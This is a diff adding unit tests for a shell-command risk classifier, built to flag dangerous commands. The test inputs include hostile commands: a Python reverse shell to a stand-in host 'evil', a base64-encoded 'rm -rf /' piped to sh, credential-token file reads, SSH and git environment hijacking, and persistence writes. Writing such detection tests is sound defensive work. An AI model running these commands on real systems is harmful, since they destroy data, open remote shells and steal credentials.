@@ -3705,4 +3705,181 @@ describe('classifyCommand v1.10.157+ recent additions', () => {
         `${cmd}: should not match`);
     }
   });
+
+  // (v1.10.205) Backfill tests for v1.10.193-204 rules.
+  it('cloud-storage-public: s3api/gsutil/az ACL → high (v1.10.193)', () => {
+    for (const cmd of [
+      'aws s3api put-bucket-acl --bucket evil --acl public-read',
+      'aws s3api put-bucket-acl --bucket evil --acl public-read-write',
+      'aws s3api put-object-acl --bucket evil --key file --acl public-read',
+      'gsutil iam ch allUsers:objectViewer gs://mybucket',
+      'az storage container set-permission --name container --public-access blob',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'high', `${cmd} should be high`);
+      assert.ok(r.reasons.some((x) => x.code === 'cloud-storage-public'),
+        `${cmd}: expected cloud-storage-public`);
+    }
+  });
+
+  it('base64 unquoted decoder (v1.10.194)', () => {
+    // Unquoted b64 payload was previously LOW
+    assert.strictEqual(
+      classifyCommand('echo cm0gLXJmIC8= | base64 -d | sh').level,
+      'critical'
+    );
+  });
+
+  it('nsenter-pid1 unshare extension (v1.10.195)', () => {
+    for (const cmd of [
+      'unshare --user --map-root-user bash',
+      'unshare --map-root-user',
+      'unshare -U --map-root-user bash',
+    ]) {
+      assert.strictEqual(classifyCommand(cmd).level, 'critical');
+    }
+    // plain --user without map-root stays low
+    assert.strictEqual(classifyCommand('unshare --user bash').level, 'low');
+  });
+
+  it('at-schedule systemd-run extension (v1.10.196)', () => {
+    for (const cmd of [
+      'systemd-run --on-active=10s /tmp/evil',
+      'systemd-run --on-boot=5min /tmp/evil',
+      'systemd-run --on-calendar=daily /tmp/evil',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.ok(['medium', 'high'].includes(r.level), `${cmd} should be medium+`);
+      assert.ok(r.reasons.some((x) => x.code === 'at-schedule'),
+        `${cmd}: expected at-schedule`);
+    }
+    // immediate run / help stay low
+    assert.strictEqual(classifyCommand('systemd-run /tmp/evil').level, 'low');
+    assert.strictEqual(classifyCommand('systemd-run --help').level, 'low');
+  });
+
+  it('ssh-client-config-write (v1.10.197)', () => {
+    for (const cmd of [
+      'echo "Host *\\nProxyCommand /tmp/evil" >> ~/.ssh/config',
+      'echo "ProxyCommand /tmp/evil" >> /etc/ssh/ssh_config',
+      'echo evil > /etc/ssh/ssh_config.d/00-evil.conf',
+      'cat key | tee /etc/ssh/ssh_config',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'high', `${cmd} should be high`);
+      assert.ok(r.reasons.some((x) => x.code === 'ssh-client-config-write'),
+        `${cmd}: expected ssh-client-config-write`);
+    }
+    assert.strictEqual(classifyCommand('cat ~/.ssh/config').level, 'low');
+  });
+
+  it('quoted-token unwrap (v1.10.198)', () => {
+    // Standalone quoted alphabetic-only at command start
+    assert.strictEqual(classifyCommand('"rm" -rf /').level, 'critical');
+    assert.strictEqual(classifyCommand("'rm' -rf /").level, 'critical');
+    // Multi-word quoted args stay low
+    assert.strictEqual(classifyCommand('echo "hello world"').level, 'low');
+    assert.strictEqual(classifyCommand('git commit -m "fix bug"').level, 'low');
+  });
+
+  it('cron-spool-write at-spool extension (v1.10.199)', () => {
+    for (const cmd of [
+      'echo evil > /var/spool/atjobs/00001',
+      'echo evil > /var/spool/at/00001',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'high', `${cmd} should be high`);
+      assert.ok(r.reasons.some((x) => x.code === 'cron-spool-write'),
+        `${cmd}: expected cron-spool-write`);
+    }
+  });
+
+  it('passwd-no-auth newusers extension (v1.10.199)', () => {
+    for (const cmd of ['newusers /tmp/evil-users.txt', 'sudo newusers users.csv']) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'high', `${cmd} should be high`);
+      assert.ok(r.reasons.some((x) => x.code === 'passwd-no-auth'),
+        `${cmd}: expected passwd-no-auth`);
+    }
+  });
+
+  it('system-files /etc/exports + samba.conf extension (v1.10.200)', () => {
+    for (const cmd of [
+      'echo "/ *(rw,no_root_squash)" > /etc/exports',
+      'echo evil > /etc/samba/smb.conf',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'high', `${cmd} should be high`);
+      assert.ok(r.reasons.some((x) => x.code === 'system-files'),
+        `${cmd}: expected system-files`);
+    }
+  });
+
+  it('rc-file-write csh + /etc/skel extension (v1.10.201)', () => {
+    for (const cmd of [
+      'echo evil > /etc/csh.cshrc',
+      'echo evil > /etc/csh.login',
+      'echo evil > /etc/skel/.bashrc',
+      'echo evil > /etc/skel/.profile',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'high', `${cmd} should be high`);
+      assert.ok(r.reasons.some((x) => x.code === 'rc-file-write'),
+        `${cmd}: expected rc-file-write`);
+    }
+  });
+
+  it('interpreter-shell-exec socket reverse-shell (v1.10.202)', () => {
+    for (const cmd of [
+      'python -c "import socket; s = socket.socket(); s.connect((\\"evil\\", 4444))"',
+      "python3 -c \"import socket,os,pty; s=socket.socket(); s.connect(('evil',4444)); os.dup2(s.fileno(),0); pty.spawn('/bin/sh')\"",
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'critical', `${cmd} should be critical`);
+      assert.ok(r.reasons.some((x) => x.code === 'interpreter-shell-exec'),
+        `${cmd}: expected interpreter-shell-exec`);
+    }
+  });
+
+  it('container-daemon-config (v1.10.203)', () => {
+    for (const cmd of [
+      'echo evil > /etc/docker/daemon.json',
+      'echo evil > /etc/containerd/config.toml',
+      'echo evil > /etc/crictl.yaml',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'critical', `${cmd} should be critical`);
+      assert.ok(r.reasons.some((x) => x.code === 'container-daemon-config'),
+        `${cmd}: expected container-daemon-config`);
+    }
+    // reads stay low
+    assert.strictEqual(classifyCommand('cat /etc/docker/daemon.json').level, 'low');
+  });
+
+  it('shell-env-inject SSH_AUTH_SOCK + GIT_SSH_COMMAND (v1.10.204)', () => {
+    for (const cmd of [
+      'export SSH_AUTH_SOCK=/tmp/evil.sock',
+      'SSH_AUTH_SOCK=/tmp/evil.sock ssh user@host',
+      'export GIT_SSH_COMMAND="/tmp/evil"',
+      'GIT_SSH_COMMAND=/tmp/evil git pull',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'critical', `${cmd} should be critical`);
+      assert.ok(r.reasons.some((x) => x.code === 'shell-env-inject'),
+        `${cmd}: expected shell-env-inject`);
+    }
+  });
+
+  it('credential-read GitHub/GitLab CLI tokens (v1.10.204)', () => {
+    for (const cmd of [
+      'cat ~/.config/gh/hosts.yml',
+      'cat /home/user/.config/gh/hosts.yml',
+      'cat ~/.config/glab-cli/config.yml',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'high', `${cmd} should be high`);
+      assert.ok(r.reasons.some((x) => x.code === 'credential-read'),
+        `${cmd}: expected credential-read`);
+    }
+  });
 });
